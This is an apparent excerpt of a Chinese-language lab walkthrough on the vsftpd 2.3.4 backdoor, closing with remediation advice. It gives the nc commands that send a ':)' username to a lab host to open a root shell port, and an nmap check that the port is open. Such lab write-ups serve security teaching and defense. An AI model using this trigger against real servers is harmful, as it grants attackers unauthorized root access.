### 3. 网络环境

虚拟机统一 NAT 模式，攻击机与靶机互通

靶机 IP：192.168.225.130

## 三、漏洞原理

vsftpd 2.3.4 版本存在恶意后门，开发者在源码中植入恶意逻辑：
当客户端连接 **21 端口 FTP 服务**，提交的**用户名包含 `:)` 笑脸符号**时，程序会自动触发后门，在靶机本地开启 **6200 端口**，攻击者可通过该端口直接获取 **root 最高权限 Shell**。

特点：

1. 正常状态 6200 端口关闭，**必须手动触发后门才会开启**
2. 无需账号密码正确，只要带特定符号即可触发
3. 直接获取最高权限，危害极高

### 步骤 4：NC 连接 FTP 并触发后门

使用 nc 连接靶机 21 端口：

```
nc 192.168.225.130 21
```

输入恶意用户名触发后门：

```
USER root:)
PASS 123
```

> 
> 关键点：用户名末尾必须带 `:)`，无空格

### 步骤 5：验证后门端口开启

新开终端扫描 6200 端口：

```
nmap -Pn -p 6200 192.168.225.130
```

端口变为 open，后门触发成功。

## 六、漏洞总结

1. vsftpd2.3.4 属于**人为植入后门漏洞**，不是代码逻辑漏洞。
2. 漏洞核心：**特殊用户名符号触发 6200 后门端口**。
3. 危害极大：攻击者无需验证，直接获取服务器 root 权限。
4. 修复方案：
   - 升级 vsftpd 至最新安全版本
   - 禁止外网直接开放 21 端口
   - 部署防火墙端口限制与入侵检测
